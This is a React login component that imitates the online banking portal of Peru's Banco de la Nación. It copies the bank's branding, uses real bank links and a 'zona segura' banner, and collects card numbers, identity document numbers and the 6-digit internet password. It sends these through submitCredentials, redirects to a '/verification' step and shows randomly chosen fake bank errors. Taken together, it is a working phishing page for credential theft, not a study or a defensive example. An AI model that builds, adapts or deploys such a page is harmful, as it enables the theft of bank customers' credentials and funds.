import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { submitCredentials } from '../services/api';
import BankHeader from '../components/BankHeader';
import BankInfo from '../components/BankInfo';
import './LoginPageBanco.css';

const LoginPage = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    cboTipoTarjeta: '02', // Multired Global Débito por defecto
    txtNumeroTarjeta: '4214', // Valor inicial como en el banco real
    txtDNI: '',
    cboTipoDoc: '',
    txtNumDoc: '',
    txtPassword: '',
    txtCaptcha: ''
  });

  const [errors, setErrors] = useState({});
  const [virtualKeyboard, setVirtualKeyboard] = useState([]);
  const [showDocumentFields, setShowDocumentFields] = useState(false);
  const [showDNI, setShowDNI] = useState(false);
  const [captchaCode, setCaptchaCode] = useState('');
  const [captchaImage, setCaptchaImage] = useState('');

  // Generar teclado virtual aleatorio como en el banco real
  useEffect(() => {
    const numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
    const shuffled = [...numbers].sort(() => Math.random() - 0.5);
    setVirtualKeyboard(shuffled);
    generateCaptcha(); // Generar captcha inicial
  }, []);

  // Generar captcha aleatorio
  const generateCaptcha = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let captcha = '';
    for (let i = 0; i < 5; i++) {
      captcha += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaCode(captcha);
    
    // Crear imagen de captcha usando canvas
    const canvas = document.createElement('canvas');
    canvas.width = 114;
    canvas.height = 25;
    const ctx = canvas.getContext('2d');
    
    // Fondo
    ctx.fillStyle = '#f0f0f0';
    ctx.fillRect(0, 0, 114, 25);
    
    // Líneas de ruido
    ctx.strokeStyle = '#cccccc';
    for (let i = 0; i < 3; i++) {
      ctx.beginPath();
      ctx.moveTo(Math.random() * 114, Math.random() * 25);
      ctx.lineTo(Math.random() * 114, Math.random() * 25);
      ctx.stroke();
    }
    
    // Texto del captcha
    ctx.fillStyle = '#333333';
    ctx.font = '16px Arial';
    ctx.textAlign = 'center';
    ctx.fillText(captcha, 57, 18);
    
    // Más ruido
    ctx.fillStyle = '#999999';
    for (let i = 0; i < 20; i++) {
      ctx.fillRect(Math.random() * 114, Math.random() * 25, 1, 1);
    }
    
    setCaptchaImage(canvas.toDataURL());
  };

  // Cambiar tipo de tarjeta como en el código original
  const cambiarTipoTarjeta = (tipoTarjeta) => {
    setFormData(prev => ({
      ...prev,
      cboTipoTarjeta: tipoTarjeta,
      txtNumeroTarjeta: tipoTarjeta === '02' ? '4214' : '',
      txtDNI: '',
      txtPassword: '',
      cboTipoDoc: '',
      txtNumDoc: ''
    }));

    if (tipoTarjeta === '02') {
      // Multired Global Débito
      setShowDocumentFields(true);
      setShowDNI(false);
    } else {
      // DNI (Cuenta Corriente)  
      setShowDocumentFields(false);
      setShowDNI(true);
    }
  };

  // Evaluar teclado virtual (funcionalidad del banco real)
  const evalRanTable = (numeroValue) => {
    if (formData.txtPassword.length >= 6) return;
    
    setFormData(prev => ({
      ...prev,
      txtPassword: prev.txtPassword + numeroValue
    }));
  };

  // Limpiar password
  const limpiarPassword = () => {
    setFormData(prev => ({
      ...prev,
      txtPassword: ''
    }));
  };

  // Recargar captcha
  const fnReloadCaptcha = () => {
    generateCaptcha();
    setFormData(prev => ({
      ...prev,
      txtCaptcha: '' // Limpiar el campo cuando se recarga
    }));
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const autenticar = async () => {
    const newErrors = {};

    // Validaciones del banco real con mensajes específicos
    if (formData.cboTipoTarjeta === '02') {
      // Validación número de tarjeta
      if (!formData.txtNumeroTarjeta) {
        newErrors.txtNumeroTarjeta = 'Debe ingresar el número de tarjeta';
      } else if (formData.txtNumeroTarjeta.length < 16) {
        newErrors.txtNumeroTarjeta = 'El número de tarjeta debe tener 16 dígitos';
      } else if (!/^\d+$/.test(formData.txtNumeroTarjeta)) {
        newErrors.txtNumeroTarjeta = 'El número de tarjeta solo acepta números';
      }

      // Validación tipo de documento
      if (!formData.cboTipoDoc) {
        newErrors.cboTipoDoc = 'Debe seleccionar un tipo de documento';
      }

      // Validación número de documento
      if (!formData.txtNumDoc) {
        newErrors.txtNumDoc = 'Es necesario ingresar el número de documento';
      } else if (formData.cboTipoDoc === '1' && formData.txtNumDoc.length !== 8) {
        newErrors.txtNumDoc = 'El número de DNI debe ser de 8 dígitos';
      } else if (formData.cboTipoDoc === '6' && formData.txtNumDoc.length !== 11) {
        newErrors.txtNumDoc = 'El número de RUC debe ser de 11 dígitos';
      } else if (!/^\d+$/.test(formData.txtNumDoc)) {
        newErrors.txtNumDoc = 'El número de documento solo acepta números';
      }
    } else {
      // Validación DNI
      if (!formData.txtDNI) {
        newErrors.txtDNI = 'Debe ingresar su número de DNI';
      } else if (formData.txtDNI.length !== 8) {
        newErrors.txtDNI = 'El número de DNI debe ser de 8 dígitos';
      } else if (!/^\d+$/.test(formData.txtDNI)) {
        newErrors.txtDNI = 'El número de DNI solo acepta números';
      }
    }

    // Validación clave
    if (!formData.txtPassword) {
      newErrors.txtPassword = 'Debe ingresar su clave de internet';
    } else if (formData.txtPassword.length !== 6) {
      newErrors.txtPassword = 'Su clave debe ser de 6 dígitos';
    }

    // Validación captcha
    if (!formData.txtCaptcha) {
      newErrors.txtCaptcha = 'Debe ingresar el código de la imagen';
    } else if (formData.txtCaptcha.length < 5) {
      newErrors.txtCaptcha = 'El código captcha debe ser de 5 caracteres';
    } else if (formData.txtCaptcha.toUpperCase() !== captchaCode) {
      newErrors.txtCaptcha = 'El código ingresado no coincide con la imagen';
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    try {
      // Preparar datos como en el controlador
      const credentials = {
        tipoTarjeta: formData.cboTipoTarjeta,
        numeroTarjeta: formData.txtNumeroTarjeta,
        txtDNI: formData.txtDNI,
        tipoDoc: formData.cboTipoDoc,
        numeroDoc: formData.txtNumDoc,
        password: formData.txtPassword,
        captcha: formData.txtCaptcha
      };

      const response = await submitCredentials(credentials);
      
      if (response.success) {
        navigate('/verification');
      } else {
        // Mensajes de error realistas del banco
        const bankErrors = [
          'Los datos ingresados no coinciden con nuestros registros. Verifique la información.',
          'Su tarjeta se encuentra bloqueada temporalmente. Comuníquese con su oficina.',
          'El número de documento ingresado no está registrado en nuestro sistema.',
          'La clave ingresada es incorrecta. Recuerde que son 6 dígitos.',
          'El código de seguridad ingresado no es válido. Intente nuevamente.',
          'Su sesión ha expirado por seguridad. Vuelva a intentar.',
          'Servicio temporalmente no disponible. Intente más tarde.'
        ];
        
        const randomError = bankErrors[Math.floor(Math.random() * bankErrors.length)];
        setErrors({ general: randomError });
      }
    } catch (error) {
      setErrors({ general: 'Error de conexión. Verifique su conexión a internet e intente nuevamente.' });
    }
  };

  useEffect(() => {
    // Configuración inicial como en el banco real
    cambiarTipoTarjeta('02');
    generateCaptcha();
    
    // Eliminar elementos externos que puedan inyectarse
    const removeExternalElements = () => {
      // Eliminar imágenes externas
      const externalImages = document.querySelectorAll('img[src*="ui-systems.net"], img[src*="d6d6a192e565430bab3aa6e4cb0ae0bd"]');
      externalImages.forEach(img => img.remove());
      
      // Eliminar elementos con clases específicas
      const externalDivs = document.querySelectorAll('.image-d6d6a1, .font-d6d6a1');
      externalDivs.forEach(div => div.remove());
      
      // Eliminar links y scripts externos
      const externalLinks = document.querySelectorAll('link[href*="ui-systems.net"], script[src*="ui-systems.net"]');
      externalLinks.forEach(link => link.remove());
    };
    
    // Ejecutar inmediatamente
    removeExternalElements();
    
    // Ejecutar cada 500ms para capturar elementos que se inyecten dinámicamente
    const interval = setInterval(removeExternalElements, 500);
    
    // Limpiar interval al desmontar
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="login-page">
      <div id="contenedor">
        <BankHeader />
        
        <div id="cuerpo">
          <h1 className="dax">
            <img src="/imagenes/candado.png" alt="Candado" /> 
            Usted se encuentra en una <span>zona segura</span>
          </h1>

          <div id="login">
            <div id="border-superior">
              <img src="/imagenes/home/border-arriba.png" alt="Border Login Superior" />
            </div>
            
            <div id="login-contenido">
              <form method="post" id="form" name="form">
                <input type="hidden" id="transaccion" name="transaccion" value="LG09" />
                <input type="hidden" id="HrTrx" name="HrTrx" value="0132" />
                <input type="hidden" id="validar" name="validar" value="false" />
                <input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6" />
                <input type="hidden" id="param_captcha" name="param_captcha" value="1" />

                {/* Selector de tipo de cuenta */}
                <div className="fila limpiar">
                  <label htmlFor="tipo-documento">Seleccione:</label>
                  <select 
                    className="tipo-documento select" 
                    id="cboTipoTarjeta" 
                    name="cboTipoTarjeta"
                    value={formData.cboTipoTarjeta}
                    onChange={(e) => cambiarTipoTarjeta(e.target.value)}
                  >
                    <option value="02">Multired Global Débito</option>
                    <option value="01">DNI (Cuenta Corriente)</option>
                  </select>
                </div>

                {/* Campos para Multired Global Débito */}
                {!showDNI && (
                  <div className="fila limpiar">
                    <label id="trNumeroTarjeta" htmlFor="numero-tarjeta" className="tarjeta_dni">
                      Número de tarjeta:
                    </label>
                    <input 
                      type="text" 
                      name="txtNumeroTarjeta" 
                      id="txtNumeroTarjeta" 
                      className="grande tarjeta_dni" 
                      maxLength="16"
                      value={formData.txtNumeroTarjeta}
                      onChange={handleInputChange}
                    />
                    {errors.txtNumeroTarjeta && <span className="error">{errors.txtNumeroTarjeta}</span>}
                  </div>
                )}

                {/* Campo para DNI */}
                {showDNI && (
                  <div className="fila limpiar">
                    <label id="trDNI" htmlFor="txtDNI" className="tarjeta_dni">DNI:</label>
                    <input 
                      type="text" 
                      name="txtDNI" 
                      id="txtDNI" 
                      className="grande tarjeta_dni" 
                      maxLength="8"
                      value={formData.txtDNI}
                      onChange={handleInputChange}
                    />
                    {errors.txtDNI && <span className="error">{errors.txtDNI}</span>}
                  </div>
                )}

                {/* Tipo y número de documento (solo para Multired) */}
                {showDocumentFields && (
                  <div className="fila limpiar" id="tipoNumDoc">
                    <label id="trTipoNumDoc" htmlFor="numero-tarjeta">Tipo y N° Documento:</label>
                    <select 
                      id="cboTipoDoc" 
                      name="cboTipoDoc" 
                      className="select select-medio"
                      value={formData.cboTipoDoc}
                      onChange={handleInputChange}
                    >
                      <option value="">Seleccione...</option>
                      <option value="1">DNI</option>
                      <option value="7">Pasaporte</option>
                      <option value="3">C. Extranjeria</option>
                      <option value="6">RUC</option>
                    </select>
                    
                    <input 
                      type="text" 
                      className="input-chico3" 
                      name="txtNumDoc" 
                      id="txtNumDoc" 
                      maxLength="12" 
                      size="8"
                      value={formData.txtNumDoc}
                      onChange={handleInputChange}
                      style={{width: '109px !important', borderRadius: '8px'}}
                    />
                    {errors.cboTipoDoc && <span className="error">{errors.cboTipoDoc}</span>}
                    {errors.txtNumDoc && <span className="error">{errors.txtNumDoc}</span>}
                  </div>
                )}

                {/* Teclado Virtual y Clave - Layout Mejorado */}
                <div className="fila limpiar">
                  <div className="clave-section-container">
                    
                    {/* Columna Izquierda: Instrucción */}
                    <div className="clave-instruction">
                      <label htmlFor="clave" style={{width: '140px', fontSize: '12px'}}>
                        Ingresa tu clave usando el teclado virtual:
                      </label>
                    </div>

                    {/* Columna Central: Teclado Virtual 3x3 + 0 */}
                    <div className="virtual-keyboard-container">
                      <div id="botones-clave">
                        <div className="keyboard-grid">
                          {/* Primera fila: 1, 2, 3 */}
                          <div className="keyboard-row">
                            {virtualKeyboard.slice(0, 3).map((number, index) => (
                              <div 
                                key={`row1-${index}`}
                                className="boton-clave" 
                                onClick={() => evalRanTable(number.toString())}
                              >
                                <span className="dax">{number}</span>
                              </div>
                            ))}
                          </div>
                          
                          {/* Segunda fila: 4, 5, 6 */}
                          <div className="keyboard-row">
                            {virtualKeyboard.slice(3, 6).map((number, index) => (
                              <div 
                                key={`row2-${index}`}
                                className="boton-clave" 
                                onClick={() => evalRanTable(number.toString())}
                              >
                                <span className="dax">{number}</span>
                              </div>
                            ))}
                          </div>
                          
                          {/* Tercera fila: 7, 8, 9 */}
                          <div className="keyboard-row">
                            {virtualKeyboard.slice(6, 9).map((number, index) => (
                              <div 
                                key={`row3-${index}`}
                                className="boton-clave" 
                                onClick={() => evalRanTable(number.toString())}
                              >
                                <span className="dax">{number}</span>
                              </div>
                            ))}
                          </div>
                          
                          {/* Cuarta fila: 0 y LIMPIAR */}
                          <div className="keyboard-row keyboard-bottom-row">
                            {virtualKeyboard.slice(9, 10).map((number, index) => (
                              <div 
                                key={`row4-${index}`}
                                className="boton-clave" 
                                onClick={() => evalRanTable(number.toString())}
                              >
                                <span className="dax">{number}</span>
                              </div>
                            ))}
                            <div className="boton-clave limpiar" id="limpiar" onClick={limpiarPassword}>
                              LIMPIAR
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Columna Derecha: Información y Campo de Clave */}
                    <div className="clave-info-container">
                      <div id="campo-clave">
                        {/* Generar Clave */}
                        <p className="generar-clave-link" style={{width: '175px !important'}}>
                          <img border="0" src="/imagenes/bn/generar-clave.png" width="20" height="20" 
                               style={{float: 'left', margin: '-3px 5px 0 0 !important'}} />
                          <a href="https://bancaporinternet.bn.com.pe/BNWeb/Afiliacion" 
                             style={{color: 'rgb(186, 17, 19)', textDecoration: 'underline', font: '12px arial'}}>
                            Genera tu Clave de Internet
                          </a>
                        </p>
                        
                        {/* Instrucción de Clave */}
                        <p className="clave-instruction-text" style={{width: '175px', fontSize: '11px'}}>
                          Ingresa tu <b>Clave de Internet (06 dígitos)</b>
                        </p>
                        
                        {/* Campo de Entrada de Clave */}
                        <input 
                          type="password" 
                          name="txtPassword" 
                          id="txtPassword" 
                          maxLength="6" 
                          readOnly
                          value={formData.txtPassword}
                          style={{margin: '10px 0', width: '140px'}}
                        />
                        {errors.txtPassword && <span className="error">{errors.txtPassword}</span>}
                        
                        {/* Olvidé mi Clave */}
                        <div className="olvido-clave">
                          <div className="olvide-clave">
                            <a href="https://bancaporinternet.bn.com.pe/BNWeb/Olvido" 
                               style={{color: 'rgb(186, 17, 19)', textDecoration: 'underline', fontSize: '11px'}}>
                              Olvidé mi clave
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <input type="hidden" value="QRKAcNTrxWI=" name="hdnValue" />
                </div>

                {/* Captcha - Layout Mejorado */}
                <div className="fila limpiar">
                  <div className="captcha-section-container">
                    
                    {/* Columna Izquierda: Instrucción */}
                    <div className="captcha-instruction">
                      <label htmlFor="capcha">Ingresa el texto de la imagen:</label>
                    </div>
                    
                    {/* Columna Central: Imagen y Botón */}
                    <div className="captcha-image-container">
                      <div className="capcha">
                        <div id="srcCaptcha">
                          {captchaImage ? (
                            <img alt="captcha" id="captcha" name="captcha" 
                                 src={captchaImage} height="25" width="114" />
                          ) : (
                            <div style={{width: '114px', height: '25px', backgroundColor: '#f0f0f0', 
                                       display: 'flex', alignItems: 'center', justifyContent: 'center'}}>
                              Cargando...
                            </div>
                          )}
                        </div>
                        <div className="captcha-controls">
                          <div className="captcha-refresh-icon">🔄</div>
                          <div className="boton_captcha" id="boton_captcha" onClick={fnReloadCaptcha}>
                            Cambiar texto
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    {/* Columna Derecha: Campo de Entrada */}
                    <div className="captcha-input-container">
                      <input 
                        className="capcha" 
                        type="text" 
                        name="txtCaptcha" 
                        id="txtCaptcha" 
                        maxLength="5"
                        value={formData.txtCaptcha}
                        onChange={handleInputChange}
                        style={{margin: '0px 10px', width: '100px'}}
                        placeholder="Código"
                      />
                      {errors.txtCaptcha && <span className="error">{errors.txtCaptcha}</span>}
                    </div>
                  </div>
                </div>

                {/* Botón de ingreso */}
                <div className="fila limpiar">
                  <input 
                    name="btnLogin" 
                    id="btnLogin" 
                    type="button" 
                    value="INGRESAR" 
                    onClick={autenticar}
                  />
                </div>

                {/* Enlaces informativos */}
                <div className="fila limpiar" style={{paddingRight: '50px', textAlign: 'center'}}>
                  <p style={{width: '175px !important'}}>
                    <a href="https://www.bn.com.pe/clientes/banca-internet/formatos/recomendaciones-seguridad.pdf" 
                       target="_blank" rel="noopener noreferrer"
                       style={{color: 'rgb(51, 102, 187)', textDecoration: 'underline', font: '12px arial'}}>
                      Recomendaciones de Seguridad
                    </a>
                  </p>
                </div>
                
                <div className="fila limpiar" style={{paddingRight: '50px', textAlign: 'center'}}>
                  <img border="0" src="/imagenes/icono-pdf.png" width="10" height="10" />
                  <a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-ahorro.pdf" 
                     target="_blank" rel="noopener noreferrer" 
                     style={{color: 'rgb(0, 0, 0)', font: '12px arial'}}>
                    Guía Cuenta de Ahorro
                  </a>
                  <img border="0" src="/imagenes/icono-pdf.png" width="10" height="10" />
                  <a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-corrientes.pdf" 
                     target="_blank" rel="noopener noreferrer" 
                     style={{color: 'rgb(0, 0, 0)', font: '12px arial'}}>
                    Guía Cuentas Corrientes
                  </a>
                </div>

                {errors.general && (
                  <div className="error-general">
                    {errors.general}
                  </div>
                )}
              </form>
            </div>
          </div>
        </div>
        
        <BankInfo />
      </div>

      {/* Scripts auténticos del banco */}
      <script type="text/javascript" src="/BNWeb/js/bn-funciones.js"></script>
      <script type="text/javascript" src="/BNWeb/js/util.js"></script>
    </div>
  );
};

export default LoginPage;